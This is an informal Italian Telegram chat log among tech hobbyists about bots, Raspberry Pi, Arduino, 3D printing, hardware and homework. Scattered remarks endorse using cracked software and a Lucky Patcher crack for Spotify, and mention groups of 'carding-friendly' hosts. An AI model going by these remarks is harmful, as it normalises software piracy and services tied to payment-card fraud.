No, ma puoi comprare i Bitcoin con paysafecard
Eh, Girada... Dà un po' un'occhiata a questo e ne riparliamo 

cit. La mano dell giustizia

 ma come si disabilità un webhook
?
Molto strano, io ne ho fatto diversi di bot in php su altervista e mai avuto questi problemi. Sicuro di aver settatobene il webhook?
Settando il WebHook vuoto
Webhook vuoto o c'è il metodo che lo elimina
 cit. Pietro Albini
l'ho settato con 
ma all'inizio mi ero dimenticato di specificare script1.php ma ho riscritto il comando corretto
?url=*
ma non mi dava errori
come si chiama questo metodo
cosa dovrei fare in conclusione?
?
Crea uno script che ogni 2 secondi verifica se il bot ha ricevuto messaggi con getUpdates
e quindi non uso webHooks?
Eh
Per usarlo come pc desktop 
Quindi navigare su internet è buono:
HP 255 G6, Notebook 15.6 pollici, APU AMD E2-9000e, RAM 4GB, HDD 500 GB, 1366x768, Senza sistema operativo, Nero 

ma sto imparando a creare bot, in php vorrei anche impararli ma tu che hai usato altervista secondo te può essere causato dal server il problema, magari non c'è qualche impostazione giusta?
Questa è la sintassi corretta per le URL Query
Quindi prova così
l'avevo gia fatto non mi da errori ma allos stesso tempo non funziona lo script
E 

gia fatto
provo a creare un altro dominio, tu avevi settato qualcosa di particolare?
ma come si disattiva un webhook? mi mandi la query url?
Io non l'ho mai fatto, ho sempre sviluppato i Bot in Python
quindi telepot?
C'è tutto qui
Ci sono anche 
 e 
 eh
Ma io utilizzo telepot
serve comunque un dominio?
Serve un VPS
come si fa a impostarla
?
Prima bisognerebbe comprarlo
si può usare un rasberry pi?
PytelegramBotApi >>>>>>
obvious
Solo se usi webhook
Certo, basta che sia costantemente acceso e connesso a internet
come si configura?
il raspberry?
Devi avere anche una rete decentemente veloce
Basta eseguire uno script Python
quello del bot
Sì
Sarebbero le prepagate?
Ti danno uno scontrino che puoi usare
Con un codice
Al tabaccaio?
Si
Se qualcuno se lo chiedeva...
Wtf?
Exabyte?
spiegami dove caaaaazzo trovi un disco da 1 exabyte

è photoshoppata
Mi sa che non devo chiedere un alto ssd 
uhm beh
dice 64 giga rimasti ma la barra blu sta al minimo
E dove trovi 1 EB di roba
1000 TB fanno 1 EB
Google file stream
O è modificato il disco
ah avevo letto 64 GB occupati  lol

Ok allora è Photoshop 
no
See vabbè
Come fanno ad esserci 67 GB disponibili su 1000000 GB totali e la barra blu ad essere vuota?
abbastanza immagini?
+
Mistero di microsoft
e poi, Google drive:
1. Non ha un piano utente da 1EB
2. Non si può connettere a Esplora Risorse
Il file stream si
ti seguo ma fosre è "approssimata per eccesso"
wtf?
1024GB sono un TB
ma è TROPPO sproporzionata
non è photoshop
dovresti dividere la barra in 1000000 parti e lasciarne bianche 67
In che senso, anzi per me dovrebbe essere rossissima
Si infatti, non ha senso lol
ma come si aggiunge a Windows? 🤔
beh si, intedevo che comunque è troppo bianca
ovviamente non lo hai con il piano free
Di fatto è un disco virtuale montato
si ma... 1 EXAbyte è troppo
in teorila lo spazio è illimitato
illimitato>1EB
Non direi, anzi forse dovrebbe essere anche più piccola è 1/10,000
probabilmente lo spazio è distribuito e montato risulta 1 EB
Boh
1000 GB = 1 TB
1000 TB = 1 EB
quindi 1 EB = 1000*1000 GB = 1000000 GB
se aspettate 4 minuti vi dico se funziona 
Fai un video allo schermo del PC, così si vede se è Photoshop o no
dammi un minuto
Ecco la prova che non è photoshop
ok?
ok 
Quanto hai pagato per quel piano di Drive?
8€

Solo?
Per le scuole è gratis se non sbaglio
quello da 4
RAGA MA CHE FIGATA
e tra l'altro io ce l'ho gratis, con la scuola
wow
E non me lo dici? ☹️
pesavo fosse quello da 4.
Se è quello da 8 tanta roba
però... che differenza fa con il normale upload/download da Drive?
io so che ho storage illimitato e mail con dominio personale (della mia scuola, ovviamente)
cosa?
che hai la possibilità di gestire drive di team e che puoi tenere files o cartelle o offline o "solo online": usando una sorta di stream quando hai bisogno dei files
mm vedo vedo... sembra figo, peccato non funzioni con gli account privati
Che hai storage illimitato, così ti passavo i miei file più importanti 
Un dettaglio

Appunto ha 100gb disponibili quindi quella barra è un 10000 della totale o se preferisci 0.01% del totale, è normale sia appena visibile
ma in realtà alla fine è un bug di Windows
perchè il "disco" ha una grandezza illimitata
e quindi Windows non capisce più nulla
Non illimitata per lo standard NTSC arrivi al max ad 1 EB teorico
appunto, è per quello che Windows segna in modo errato la  capienza, e di conseguenza la barra non è reale
dovrebbe costantemente essere vuota
Credo che essendo un disco virtuale il discorso sia leggermente diverso
infatti c'è scritto fat32 ma ho dentro file da più di 10GB
È un bug ahahh basta pensarci xD
I server Google non sono né fat32 né NTSC né ext 
appunto
 ma quanto ci mette a fare il coso pi porta penne, l'ho fatto partire da un'ora e non ha fatto niente xD
che spettacolo
20 ore
Già...peccato che oggi non si sciava bene, la neve é tutta morbida, coomunque...domani mattina dovrebbe essere meglio dai
rimani fino a domani sera?
Bene lo interromperò
Ma io ho messo 80mm/s come velocità... Tra un po' trovo la stampante giù dalla scrivania
Ciao qualcuno mi può consigliare qualche libro che mi consenta di entrare nel mondo di Arduino?
certo, te li mando subito
qui trovi tutto :)
Grazie
figurati..ti sto mandando tutto, ci vuole un pò di pazienza perchè la mia adsl è scarsa 
Ahahah tranquillo e grazie ancora
se ti servono i libri di elettronica ed elettrotecnica chiedi pure, abbiamo il gruppo dove mettiamo i libri e i pdf
Ok grazie per la disponibilità
figurati
 capito romboli?
Grazie!
Grazie anche da parte mia
Grazie anche da me
 prego..se volete entrate sul gruppo dei libri ufficiale del canale...https://
 ..qui inseriamo tutti i libri e pdf che condividono i ragazzi dei Makers
Quando la fibra non ci manda a fanculo logicamente ☺️
quello è un male comune purtroppo :D sto caricando tutto il materiale di Arduino
AH BELLOH
un Human Safari in versione Homer Simpson :D
ma perché per la palestra?
e soprattutto le calorie calcolate sono molto approssimate e peggiorano in base a quanto ti adatti successivamente allo stimolo
ha una utilità come contapassi fuori dalla palestra semmai
comunque ti puoi prendere un miband
Mi band 3 consigliato
È uscito il mi band 3?
No
Macché
Sennò lo avrei al polso 
Ahahahahah
Ah ecco
No, ho sbagliato a scrivere 
Ah okay
So di aver illuso molti con quel messaggio, scusate 
lo conosci?
Sta in tutti i gruppi Telegram sul Bot Developing
 vero
Sempre a mangiare....
la fine è vicina

oh god

Lego
Raffa
Ci sei anche tu in sto gruppo?
Te l'ho detto io
 potrei scriverti in privato?
No
Lol
Lego?
Si
Ahhaha ma quanto recidivo sei?
Perché ti fai un mattoncino lego
?
rip
Ragazzi devo misurare la temperatura di un motorino con un termistore (circa sferico) per farlo aderire alla superficie del motore mi conviene usare la pasta termica (quella tipo per le cpu)?
Perché boh 
Per non mandarti le offerte in privato 
Mandale su coupon di corrado
Più che altro se tutti inoltrassero tutte le offerte interessanti qui...
L'ho mandata a Corrado
Sattoh
C'è il gruppo apposta
Capito cicca?

Mi aspettavo di più da quella rivista sinceramente
Ne avevo sentito parlare bene


Buu
Matematica merda!11!1!
Ehi
\ban
Non si dice neanche per scherzo u.u
Bel libro, io frequento un corso dell'anno prossimo di storia della fisica e della matematica
Ma coincidono tutte le lezioni 

Ed è scaduto il termine per la modifica del piano di studi... Quindi mi sa che lo farò l'anno prossimo 
Uffa
Ma questa è la data di arrivo ?
Domani alle 4/5 parto purtroppo..ma tutta la mattina la passo in pista, volevamo fare un giro sulla cima se riusciamo, e giustamente io che non sono capace a sciare mi faranno scendere a forza di capotoni sulle piste nere...come oggi insomma :D
Ma tanto è neve morbida quindi ti sembra di buttarti sul letto...il problema principale è rialzarsi su una pendenza di 80° :P
No, di partenza
Con la posta di 3 € in quanto mi dovrebbe arrivare ?
Calcola sempre 15/20 giorni

Qualcuno che ha rasp mi spiega bene come si usa, quanda ram ha e quanto é potente?
Gnurant
AHAHAHAHAHHAHHAHAHHAHAHA
mettete che quando uno dice pump&dump la mano si triggera
Salve ragazzi, piacere di conoscervi, sono una mole di mercurio
Tipo così?
A mercury mole
poi boh, la gente che pensa che gli altri la debbano pensare per forza come loro
meglio lasciarli perdere
inutile anche solo provare a discuterci
comunque ho scoperto oggi che Philips rilascia delle librerie per interfacciarsi con Hue (per chi non lo sapesse sono i led strafighi)
ho visto per ora quelle in Objective-C, PHP, Python e Ruby
Dissing alle buche di roma
Ci sono da sempre
HUE è figo perché si interfaccia col mondo
E su Play Store è pieno di app non ufficiali infatti
eh ho cercato oggi per caso su github
però figo figo perché ora mi posso fare degli script in python molto comodi
Ragazzi mi date una mano a capire come funzionano i calcolatori  delle criptovalute?
Cioè ho visto che 333Mh/s etherium sono diversi da 333Mh/s del monero
Cioè fruttano diverse somme
Qualcuno ha esperienza di utilizzo su blynk?
Ciao, dove posso imparare l'assmebly?
è carino ma non te lo consiglio perché la versione hostata da loro non è del tutto gratuita
Lo so ma dovrei leggere dei dati di una serra e siccome non ho il display i2c pensavo di usare blynk
Ma esistono altri linguaggi che mi permettano di programmare il processore?
(Da quello che ho capito l'assembly serve a questo)
OK mi sono accorto di aver letto un messaggio per un altro......
WTF
mmm
hai capito poco
Un linguaggio come C/C++ può essere compilato per qualsiasi architettura, ma il codice rimane lo stesso.
Con l'Assembly no, è a livello ancora più basso e varia in base all'architettura.
....pensavo che avessi risposto alla mia domanda..
Ehbeh ovvio, un blocco di Monero non contiene lo stesso valore di un blocco di Ethereum, per esempio
eh un attimo, stavo finendo di modificare il messaggio
l'Assembly fai conto che non ti servirà a niente impararlo se non per fare reverse engineering o scrivere alcuni driver
Ma volendo si possono programmare anche apk?
in assembly dici?
Si
no
E volendo cose del tipo sistemi operativi
??
le app per Android non vengono compilate in linguaggio macchina (quindi vengono eseguite direttamente), c'è un altro programma che fa da tramite (chiamato JVM (Java Virtual Machine), o meglio, su Android prima di JVM c'è ART (Android runtime)) e il codice viene compilato in modo da essere letto e interpretato da JVM, non direttamente dal processore.
E gli unici linguaggi che usano le librerie JVM sono Java e Kotlin
Poi sì, le app per Android possono essere scritte anche in C# (con Xamarin) o in C++ (con una libreria che non ricordo come si chiama), ma mi stanno rompendo i coglioni su Discord che vogliono giocare a cs e non ho tempo per spiegarti come funziona, sorry 
A OK grazie mille
Ho letto delle Asic usb miner che fanno 333Mh/s
Che calcolatore mi consigli
Ogni volta che fai un messaggio con una parola bandita ("coglione/i") e lo modifichi 40 volte ci arrivano 80 messaggi nel canale admin 
non c'è un calcolatore giusto e uno sbagliato, usa quello della pool su cui minerai
Si ma vorrei sapere prima di comprare che hash và veramente questa usb
no spetta
come fai a saperlo se non ce l'hai? 
un calcolatore di profitto per dirti quanto guadagnerai ha bisogno dell'hashrate
non puoi dirgli "Calcolami cosa fà xxminer usb", pensaci, come fa a saperlo?
questo faceva pump&dump
?
E se non lo vuole sapere?
Yump 

l'ha chiesto lui 
C'è l'ho, hanno scritto 333Mh/s
Solo che 330Mh/s sono un pó troppi per una usb
eh appunto
non puoi saperlo finchè non ce l'hai
No ma sono sicuro che va a quel hashrate
Anche altri annunci dicono che va a 300/330mhs
Qui dici che ti sembra strano
e qui dici che sei sicuro
deciditi 
se sei sicuro, sei a posto
^
Sono sicuro che fa quel hash
Ma
Il calcolatore mi da diversi profitti
Tipo per il bitcoin mi dice 1000€ a giorno
Etherum 20€
E così via
^
Eh io quello chiedevo
Su cosa intendevano quel 330Mhz
Le ASIC USB miner
ogni cripto ha valori e reward diversi
wait, MHz è una cosa, MH/s è un'altra
Ho sbagliato a scrivere
Mhs
ok, 330MH/s non ti fanno 1000€ al giorno neanche se vuoi 
Ma devi iniziare a minare? Fammi capire
Beh no
Era per curiosità
In passato già ho minato con un bug della IBM
Marooonn l'anno scorso erano solamente 80€
Peccato che li ho già spesi..
qualcuno mi spiega meglio il pump&dump?
Ragazzi devo misurare la temperatura di un motorino con un termistore (circa sferico) per farlo aderire alla superficie del motore mi conviene usare la pasta termica (quella tipo per le cpu)?
Idem
 lo cerco su  google
ah ok
Qualcuno che ha rasp mi spiega bene come si usa, quanda ram ha e quanto é potente?
Ed è illegale?
1gb il 3
Non credo
Quanto costa?
35
Solo la scheda
Ed ha ubuntu?
Il rasp no
Cos'ha?
Stessa cosa si potrebbe fare con il bitcoin
Raspbian
Però ha raspbian Debian based
A quel punto diventa legale
1 2 3 prova
E c'é modo di mettere ubuntu?
Non lo regge mi sa
No
Non hanno fatto una versione arm
Ha dei pin?
Si
Come li uso?
Con i cavetti
E come li uso dal rasp?
Cioé come accendo/spengo/leggo i pin?
Ci sono un po' di video di overVolt, spiegati anche bene
Posso gestirli con java?
Non credo
Ma ci sono dei comandi sul cmd
O altro?
Si usa Python
Let me 
 that for you:
 

python, c++, qualsiasi linguaggio che supporta nativamente l'importazione di librerie compilate partendo dal c++ (java altamente sconsigliato)
Perché é sconsigliato?
.net
perché già java fa schifo in generale, poi in questo caso fa ancora piu schifo
rientra tra i linguaggi che supportano l'utilizzo di librerie c++
Hahahah pure tu?
anche C
pigpio è scritto in C e lo uso da C#
Già usavo i bin
ok dai c/c++ li considero simili e compatibili
Ora credo che abbiano fixato
Sarebbe figo usare i bot per minare
Io anche digitalocean
comunque raga io sono dell'idea che tocca fare un Discord ufficiale di questo gruppo
farsi due chiacchere la sera invece di chattare sarebbe figo
Lo creo io!!
nha, già uno l'aveva fatto ed è successo un bordello
quindi o lo fa un admin, o lo fa un admin
Sad world
Ma perché pesa tanto?
hai mai giocato a Minecraft?
Ottimo esempio
Si
mai avuto un server / mai giocato moddato?
Si
perché fa pena a livello di prestazioni
mai visto l'utilizzo delle risorse mentre facevi una delle due cose?
ecco, ti sei risposto da solo.
i modpack che consumano 8GB di RAM
Non ho mai avuto problemi sinceramente
è l'unico gioco dove per scegliere il server devi vedere prima la RAM che il processore
ecco l'ottimizzazione del Java
E se facessi con c?
C è il top per queste cose
Potrei usare il multi threading?
Ma eri in un gruppo che iniziava con h?
usa la libreria pigpiod per controllare il GPIO
è una libreria C fatta non bene, di più
puoi usare sia pigpio che pigpiod, ti consiglio la seconda in quanto è un daemon e continua a funzionare se il tuo programma crasha.
No i bin li ho sempre cercati da solo
Si c'è anche la guida ufficiale di Ubuntu, 

  alla fine stampata in 7 ore... Ed è uscita una cagata ahahah
Altezza layer?
0.25 tipo ahahha
Miii
E ci ha messo 7h?
Anche a 80mm/s si perché sono piene le lettere
Ma quanto è alto?
Si, pure io ma spesso in quel gruppo dicevano gli hosting cardabili
Scusate, stavo facendo una prova con il fondo scaldando il tutto, ad un certo punto mi si è spento Arduino e se ora lo reinserisco nella porta del PC si accende un secondo e poi si spegne, cosa può essere successo? L ho cotto?
Si
Quindi si può buttare
Boh è grosso, non tanto alto
Comunque mi pare strano ci abbia messo tutto sto tempo
A giulian ci ha messo 20 ore
Mi puoi passare un po di gruppi di quel genere in PRV?
Se ne hai, anche quelli pubblici
Le stampanti 3d vanno mooooolto piano
Le stampe con la k8200 della scuola non sono molto lente
Che stampante è? Comunque quella stampa è difficile, anzi io ho corso troppo, sarebbe dovuta essere stampata molto più lentamente
Velleman k8200
Deve essere più professionale e vibrerà molto meno
Non vibra quasi per niente e almeno dalla "fattura" pare abbastanza professionale
L'unico problema è il filamento della scuola che è tipo tutto irrigidito e si spacca molto facilmente
Prende umidità
Non ne ho idea, credo di si
C'è linkato un articolo nel post pinnato
Idem
Si si: non solo immorale, proprio illegale in quasi tutti gli stati
Ah
Perfetto allora 
Allora andiamo in Cambogia a sballare la borsa
In Uganda
Oh
Comunque sta cosa mi ha triggerato troppo
che idea geniale
Miii
Infatti
La novità del secolo
Vabb...modello piccolo hai fatto
Io il modello grande con altezza 0.2 ci ha messo 20 ore...a 40mm/s io non superio i 40, voglio qnche un pelo di qualità
"memoria di smartphone" mi ha steso
Hey qua ha nevicato tutta la notte
Yee, e si va a sciare
menchia
E per dire....dovrebbero vedersi dei monti alti tipo 3000m....ma c'è solo che nebbia, starà nevicando tantissimo...beh dai, oggi si rimane a col gallina mi sa, poco male, farò i peggio servizi fotografici
Raga sto urlando
visto
grazie
Hahahahahahhaha
Buon giorno a tutti
 il video esce alle 13?
Yup
Anche se è già pronto e online
8GB comunque
È 360° 720s?
Ma scusa se il vid è  meno di un ora come raggiunge 8GB??o è più di un ora?
360°????
Guarda che i video editati fatti bene pesano un bordello 
Alta quality
Comunque uscirà prima dell'una
Perché ho fatto un macielloh
yeeeee
Uh,ma cosa edita?xD cioe oltre a tagliare (solo curiosita)
wut
Grazie 
I will pay in floppy disk
Morto
Faceva notte poi

Buongiorno, ho fatto scaldare troppo il mio arduino ed ora si accende qualche secondo ma poi si spegne, soluzioni?
eeeh comprarne un altro 
Non si può fare niente?
se l'hai bruciato no 
Come lo alimenti ora?
Ora non lo alimento più✝
Lo alimentavi dalla usb?
Si
Puoi provare ad alimentare direttamente dai pin +5 e gnd ma probabilmente è andato
Cioè?

Vin e gnd
Gli sai 5volt
Si ma come faccio a mandarglielo?
MI che bel logo che hai
Non credo, Vin è collegata val regolatore di tensione, lì gli devi mandare 9V
HAHAHAAHHAHAAHAHHA
Con un alimentatore o due cavi
Con una usb tagliata da cui ricavi il rosso e il nero
Scusa ma è da poco che faccio ciò non sapevo si potesse fare
Con un vecchio alimentatore da cellulari che ha la usb rotta
E metto direttamente nei pin del 5v e gnd?
Sì, ma se non ti va dalla usb per me è uguale... Non ti funzionerà nemmeno in questo modo..
Provo
Alimentando da da pin in teoria è acceso
Se alimento da USB normale il led su on c'è ma poi lampeggia il led di TX e basta
Quindi ti funziona?
Non da nessuna risposta
Si accendono solo i led
Che bravo ragazzo
Vi ho programmato il video alle 11:00, non vi faccio aspettare fino all'una 
Grazie Enomis

ma Eclipse non ha il dark theme?
Non credo
Intellij IDEA >>>>
ma io ci perdo gli occhi
 venerdì sveglia alle 4 
Che Spam
Porta il Raspberry e 7 Powerbank
volevi dire 70 powerbank
Ah giusto
con raspbian?
Volendo 
porto anche questo no? 
Ehm, collegato possibilmente
Altrimenti se dobbiamo passare 5 ore a montarlo porto i Lego direttamente
Ma che dovete fare?
Gita da 3a media (senza pernotto tra l'altro) a Paestum
5 ore di Autobus 
Ma che cazz..
Raga, il file ssh lo posso mettere pure su retropie evitando di cliccare invio ogni volta che lo accendo?
No, nulla , cavolata, lasciate stare
Ecco...
Ma esiste un modo per avviare retropie senza cliccare invio sulla tastiera? 🤔
Certo che lo ha
Raga ma resurrection remix in cosa è più pesante rispetto a lineage os?(non dite in tutto, ditemi i punti precisi)
Ciao ragazzi 
Mi era venuta la scimmia () sul configurare un media center sul mio Raspberry pi 2 b+ montando OSMC. 

Volevo anche avere la possibilità di poter fare il login con l’account Amazon Prime Video e Tim Vision 

Come potrei fare? Grazie
Miglior software per un NAS?
Software in che senso? Os?
Vorrei utilizzare un Computer come NAS...quindi tipo FreeNAS, NAS4Free etc....il migliore?
Ah ok allora Os, io direi nas4free , freenas o openmediavault
Tra i 3?
Lo uso pure io l'ultimo è funziona molto bene
Open media vault
Conosci qualche guida?
La Wiki e il sito ufficiale
Ma comunque basta installare  il so e poi si fa tutto da interfaccia web che è fatta molto bene
ok
Yeee ho finito di montare e di settare la stampante 3d (mi è arrivata ieri)
Geeetech i3
Pro
É stato un parto sistemare asse x e y
E ancora non sembrano buone :/
ook
si?
Sapete come posso vedere l'ip locale di un dispositivo connesso al mio hotspot?
Il massimo di ram che ha il rasp é 1gb?
Oppure ci sono modelli con 2/3 gb?
Il pi 3 è da 1gb, poi ci sono gli orangepi che hanno anche 2 o più gb
E c'é modo di estendere?
no
In nessun modo?
Si
Devi risaldare completamente la ram, ma non penso sia una cosa che fai con un saldatore a stagno normalissimo
Serve del flussante
Invece per assemblare direttamente un pc con tanta ram come bisogna fare?
prima di tutto vendi un rene poi con quei soldi compri la ram, la inserisci negli slot della mobo, metti la cpu bel socket attacchi il psu e hdd premi il pulsante di avvio e hai un pc con tanta ram
Basta che vai nel markplace e trovi tutti i temi che vuoi
Non ho capito i componenti
in che senso, sono quelli di un qualsiasi pc
ok
Raga, come posso fare un circuito per vedere se le batterie son cariche?
Cioé?
Compri un pc con tanta ram
Credo che costerebbe troppo
Da quello che so assemblarli é più economico
Si, ma costa comunque tanto la ram
Già
Quanti GB/TB ti servono?
64 gb di ram
Quando costa?
A cosa ti servono?!?!?
W8 ci sono anche i tb di ram?
900 euro solo le ram
Costano più del mio intero computer
*800 
Senza sconto 990
Ma dove la metto la ram?
Negli slot della scheda madre
E quanti slot ha in genere?
Solitamente 4, qui hai 4 banchi da 16
Ti serve una scheda madre che supporta 64Gb di ram (ovvero quasi tutte)
Possono anche essere di più
Tutti gli slot devono essere pieni?
No
Non per forza
Esiste una scheda madre con 64 slot? 
Help
Ehm no
Forse
Non ci sarebbe spazio
Ed una ram quanto può essere massimo?
Basta farla più grande, di sicuro non va messa in un pc normale
Ma non avrebbe molto senso
Ma non entrerebbe neanche in un full tower
?
Non so, io conosco da 16
Forse esistono anche da 32 o 64
Eh infatti non avrebbe senso
Solo per curiosità ma gli host tipo gh come fanno?
Si parla di server, non di un unico computerino
Una sala server è gigantesca
Cioé sono computer collegati fra loro?
Più o meno
Cioé?
Sono più computer
Di solito hanno dai 64 ai 128 gb di ram
È difficile da apiegate
Ma dove abiti
È semplice
Basta che cerchi su Youtube, ci sono video in cui entrano nelle sale server
Hanno un datacenter in affitto a kpnqwest
In pratica hanno in armadietti diversi server
Ma sono collegati questi server?
Un server è un computer con certe specifiche volutamente esaltate per migliorare l'utilizzo
Beh é soggettiva come cosa
No
Comunque dipende da cosa intendi collegato
Con lan o roba simile
Intendi che sono in cluster?
Non so che vuol dire
Comunque basta ragionare
Tu prendi un dedicato in affitto
Nella rete non visualizzi i dedicati
chi mi tagga?
Quindi non sono collegati fra loro, o meglio non direttamente
Usano degli switch enormi dove ci collegano i cavi Ethernet
Altra domanda
E dei router speciali per gli uplink
Se io ho più di un pc come li collego (senza internet) e come gli faccio passare i dati
Basta che siano connessi in rete locale
Basta che siano nella stessa rete e il modem permetta lo scambio di dat
Usi l’ip locale
No. Non solo.
Per scambiare i dati c'è anche il bisogno che il modem lo permetta
Altrimenti fai poco
Continuo a non capire
Non c'è molto
Non posso semplicemente passare un cavo da un computer all'altro?
Basterebbe un router
...
Si
Lo prendo come un no(?)
Secondo te?
Come fa un PC a saper gestire una rete
Sa accedere
Ma non gestire
Altrimenti il cavo dell'adsl ti arriverebbe direttamente nel PC, no?
Risparmieresti spazio e device
E il modem può farlo senza essere connezzo ad internet?
Si
Non è necessaria una connessione ad internet
Ad un computer ci posso mettere più modem?
Un cavo ethernet va solo in una direzione
Non puoi "duplicarlo"
Come cazzo fai c'è
per connettere piu pc insieme ti serve come minimo uno switch se vuoi connettere piu reti per creare una rete di reti ti serve un router, per acere internet ti serve un modem. un modem da solo non puo connettere oiu pc insieme
Non ho capit
si ma ti servono piu schede di rete o una con piu interfaccie
Non serve lo switch
Il modem da solo può connettere un pc ad un altro?
si per unire piu pc in una rete basta uno switch
Un modem può connetterti alla rete e connettersi al tuo pc
no
Ma che cazzo dici
cosa cazz?
Io ho la Vodafone station ad esempio e posso condividere i file con mio padre
Non ho uno switch
 posso scriverti in pvt?
Si
si è integrato, cio che si compra in ambito consumer di solito è un modem/router/switch
tutto in un unico dispositivo
K
+wireless access point
Raga ma secondo voi per prendere un nuovo portatile(con schermo 360 touch e pennetta e una buona grafica)mi conviene aspettare l'anno prossimo? 
Se la risposta è no allora mi consigliate:
Hp Envy x360 con ryzen mobile
O
Hp Spectre x 360 con un i7.
I ryzen mobile non so come siano onestemte
io avevo visto dei bench e sembrano buoni
poi ovviamente dipende dal modello
Aspettare a causa di Meltdown e Spectre
Non è del tutto sbagliato
E' del tutto sbagliato
HTML è un linguaggio di markup
fine
Invece si
È comunque un linguaggio 
Montato GATEWAY, carino

Per iniziare con rasp questo va bene? (
 + il rasp che compare in Spesso comprati insieme)
 
 offertona per la 1080 da Amazon de, come sempre c'è da levare il refferreal perché non so come si fa 

❤️❤️❤️
Raffa gioca a pubg va
Ti basta il rasp + una ad senza tutto sto bordello
E un cavo microusb che avrai di sicuro a casa
actually forse si
ecco la mentalità dei fan di blackgeek
rank?
Ahahhahaha
Guardiano 1
"Ho 240€ più di te" mi ha steso
poi mi costringe pure a fare gli esempi da bambino di seconda elementare
Dettagli
suonano proprio male in italiano
btw nice, io mg2
Eee si torna a casa ._.
Intravedo un tornio
io boh
ma vai su quel video e continua a leggere
non sta finendo più la discussione
no grazie, oggi non voglio bestemmiare 
mi sono già trattenuto di là, non infierire
e comunque su sssspotify ci sono 
io usavo le versioni craccate perché non avevo soldi per un abbonamento
*apre il programma che 
 ha passato*
 Ma poi, hai pagato FL Studio? 

Qualcuno che ha il cinesone europeizzato?
Si può ritenere sicuro un server open con fatto con il rasp?
 riguardando il video delle olimpiadi di robotica del 2016 
La tab con Intellij
Non ho lo sticker bello
Ooh che Ciovane

ho la demo
Ancora con il miband 1
Eh già
il mi band 2 a 27€ li vale? E' veramente utile?
Oddio io lo ho pagato mooolto di meno
prezzo di amazon
Gearbest
ma se sul pc spotify ti da più funzioni nella modalità gratis, perchè non si fà l'apk crackato che cambia il tipo di device? (è solo un idea, spotify lo pago e posso anche farvi vedere)

qualcuno mi aiuta!!
ho settato una lampada MiLight con questo codice
light:
  platform: limitlessled
  bridges:
    - host: 

      port: 8899
      groups:
      - number: 1 
        type: rgbw 
        name: Camera

mi appare l'icona della luce e il relativo controllo Ma la luce NON risponde, ovvero non si spegne e/o cambia colore e/o accende, come mai?

cos?
Nah
Hai messo l’ip giusto?
E la porta giusta
Mattia Pascal 
si altrimenti non appare neppure l'icona
Distro linux per Xbox 360?
eeee riririeccomi, sono vivooo

è quello che avevo io, bloccato lo stesso
E come l'hanno beccato?
non lo so, ma la mail è arrivata 
 come posso fare un bot uguale identico al tuo?
Quale?
Sera
  però nel video cè da spiegare  un altra cosa
Che sicuramente parecchi troveranno problemi
Tipo?
No nulla 
 guru, non serviva un bot da zero
No era per chiedere quale dei bot che usa marco 
Intendevo il chatbot
Dipende da quele linguaggio vuoi usare
?
Credo 
È quello che spamma i messaggi?
Si
Aaah con iftt
E la parte invece che aggiunge i referral e cosevarie invece con python
Scusa il ritardo! Va più che bene!
ma prendi un 3b+
tanto hanno lo stesso costo
e il 3b+ é più potente
*poco piu potente, in realtà l'hardware è quasi identico, hanno aggiunto solo 2 cazzatine
Con lucky patcher funziona la crack
Hanno solo inalzato la fq, puoi alzarla anche sulla 3b
hanno anche migliorato la scheda di rete
da 100 a 300Mbps... bella merda
vai su rock64 che a parità di prezzo è molto meglio
Ma per migliorare la precisione di un termistore su un motore si può usare la pasta termoconduttiva (per CPU)?
la pasta al massimo migliora il tempo di risposta della sonda alle variazioni di temperatura del motore, per avere piu precisione bisogna cambiare sonda o, nel caso sia analogica, il circuito che digitalizza la misurazione
Precisa nel senso di più reattiva
Perchè essendo sferica è a contatto in un punto piccolissimo con il motore..
allora pasta termica potrebbe aiutare
Scusate un secondo
Mi hanno mandato un'operazione da risolvere
Come faccio?
Mi serve per scuola alla prima ora domani
Solo quella riga sotto?
[(C+(!A))*(B*(!A))]+(!C)
Poi penso che dovrai disegnare il circuito e fare la tabella delle verità
madonna, sono 3 anni che non vedevo espressioni booleane da semplificare
Purtroppo le stiamo facendo proprio ora a scuola
E forse ci ho preso un 1,5 per non aver preso appunti su quell'argomento
lol che sfiga
Si, ma i valori?
Nel senso....a cosa sostituisco A e B?
Come faccio sennò ad attribuire ad essi valore negativo o positivo?
Puoi usare le identità logiche
Si
Tipo not (a and b) = not a or not c
Cicca! Proprio tu mi servivi!
Cose così
Ah
Quindi continuando con le lettere?
Sisi
Poi quando la hai semplificata un bel po' in caso fai la tavola di verità
Io avevo pensato di sostituire tipo ad A un valore negativo e w B un valore negativo
Grazie mille
Nono
Cicca ma te usi wine?
Ben poco
Sorry, ma quel giorno ero assente 
Ahaah
Ma tu quando devi aprire un .exe lo apri con wine giusto?
Oggi non ne azzecco una
Di solito cerco un programma equivalente per Linux
Ehhh, pero fortinite? Poi ho un hdd Maxtor con secret zone solo in .exe
Ho pure cercato di fare un serve con con rasp
Allora sì con wine
Solo che a me non lo apre con wine
Non lo apre proprio
Cosa può essere?
No beh devi dirgli tu di usare wine
Quello è ovvio 
Non si sa mai
Boh magari non è compatibile o richiede roba aggiuntiva
Ma che palle....
Con Linux non ho ancora trovato nessun problema se non con wine
O per installere fortinite
Per il resto non ho ancora trovato qualche pecca grave
E quello non è un problema di linux 
Spero ben
tipo directx, .net o visualc++
Ecco
Sempre legato al mando Windows
Però lol parte
controllare che ci siano che quasi di sicuro ne hai bisogno
Secondo problema della giornata.....ho provato a fare un server vpn ma non vedo il wifi 
Grazie mille, proverò
Terzo problema della giornata.....se provo a usare esp 8266 e a connettermi da PC riesco, da cellulare no
Quarto problema della giornata.....ho la media del 6,5
Quinto......sono un coglione
lol
Sonoff nuovi nn si aggiungono piu via ota
Anche da voi nevica?
Nope
Nevicava
ora piovono rubinetti
 così?
Questo è un problema serio
A Roma Nord piove
Ma che cosa vogliono dire 
, 
 e 
?
Sono tre valori booleani ignoti
E devi semplificare l'espressione
Tipo se è not(not A) te scrivi A
Ah, capito
Eh, sono un bordello xD
Ma chi può dirlo, io non ci sono ancora arrivato 
ma al superiore si fa c++ ?
Boh credo di si
Obv
Poi dipende da che scuola prendi
oook
Anche se penso che ti faranno fare cose molto basilari
Io dovrei fare java
In 3°
io so le basi di c++ è un po' di java
 venerdì finisco il corso
alla gita
Java lo so direi abbastanza(tanto) bene e faccio la 3a(media )

ma perché non si fa il pitone? 
Nella scuola di 
 si fa i primi 2 anni
Ma tralasciamo il fatto che ho 5 dita di libri apogeo in libreria 

 mi trasferisco da te
io ho uno zio che programma python, un altro che programma java
Uno col c no eh?
Mi servirebbe un sacco xD
Buondí
nup
asteroideeeeeeeeee
Mi possa cascare un asteroide in testa se Gabriele Visioli scriverà qualcosa
Boom

